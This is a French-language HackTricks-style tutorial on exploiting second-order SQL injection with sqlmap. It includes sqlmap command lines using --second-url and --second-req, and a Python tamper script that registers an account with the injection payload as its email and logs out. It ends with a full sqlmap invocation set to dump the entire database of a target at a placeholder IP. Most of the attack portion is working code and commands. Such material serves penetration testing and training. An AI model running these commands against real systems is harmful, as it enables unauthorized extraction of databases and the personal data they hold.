{{#include ../../../banners/hacktricks-training.md}}

**SQLMap peut exploiter les SQLis de deuxième ordre.**\
Vous devez fournir :

- La **demande** où la **charge utile d'injection SQL** sera enregistrée
- La **demande** où la **charge utile** sera **exécutée**

La demande où la charge utile d'injection SQL est enregistrée est **indiquée comme dans toute autre injection dans sqlmap**. La demande **où sqlmap peut lire la sortie/l'exécution** de l'injection peut être indiquée avec `--second-url` ou avec `--second-req` si vous devez indiquer une demande complète à partir d'un fichier.

**Exemple simple de deuxième ordre :**
```bash
#Get the SQL payload execution with a GET to a url
sqlmap -r login.txt -p username --second-url "http://10.10.10.10/details.php"

#Get the SQL payload execution sending a custom request from a file
sqlmap -r login.txt -p username --second-req details.txt
```
Dans plusieurs cas, **cela ne suffira pas** car vous devrez **effectuer d'autres actions** en plus d'envoyer le payload et d'accéder à une autre page.

Lorsque cela est nécessaire, vous pouvez utiliser un **sqlmap tamper**. Par exemple, le script suivant enregistrera un nouvel utilisateur **en utilisant le payload sqlmap comme email** et se déconnectera.
```python
#!/usr/bin/env python

import re
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
pass

def login_account(payload):
proxies = {'http':'http://127.0.0.1:8080'}
cookies = {"PHPSESSID": "6laafab1f6om5rqjsbvhmq9mf2"}

params = {"username":"asdasdasd", "email":payload, "password":"11111111"}
url = "http://10.10.10.10/create.php"
pr = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

url = "http://10.10.10.10/exit.php"
pr = requests.get(url, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

def tamper(payload, **kwargs):
headers = kwargs.get("headers", {})
login_account(payload)
return payload
```
Un **tamper SQLMap est toujours exécuté avant de commencer une tentative d'injection avec un payload** **et il doit renvoyer un payload**. Dans ce cas, nous ne nous soucions pas du payload mais nous nous soucions d'envoyer des requêtes, donc le payload n'est pas modifié.

Donc, si pour une raison quelconque nous avons besoin d'un flux plus complexe pour exploiter l'injection SQL de deuxième ordre comme :

- Créer un compte avec le payload SQLi dans le champ "email"
- Se déconnecter
- Se connecter avec ce compte (login.txt)
- Envoyer une requête pour exécuter l'injection SQL (second.txt)

**Cette ligne sqlmap aidera :**
```bash
sqlmap --tamper tamper.py -r login.txt -p email --second-req second.txt --proxy http://127.0.0.1:8080 --prefix "a2344r3F'" --technique=U --dbms mysql --union-char "DTEC" -a
##########
# --tamper tamper.py : Indicates the tamper to execute before trying each SQLipayload
# -r login.txt : Indicates the request to send the SQLi payload
# -p email : Focus on email parameter (you can do this with an "email=*" inside login.txt
# --second-req second.txt : Request to send to execute the SQLi and get the ouput
# --proxy http://127.0.0.1:8080 : Use this proxy
# --technique=U : Help sqlmap indicating the technique to use
# --dbms mysql : Help sqlmap indicating the dbms
# --prefix "a2344r3F'" : Help sqlmap detecting the injection indicating the prefix
# --union-char "DTEC" : Help sqlmap indicating a different union-char so it can identify the vuln
# -a : Dump all
```
{{#include ../../../banners/hacktricks-training.md}}
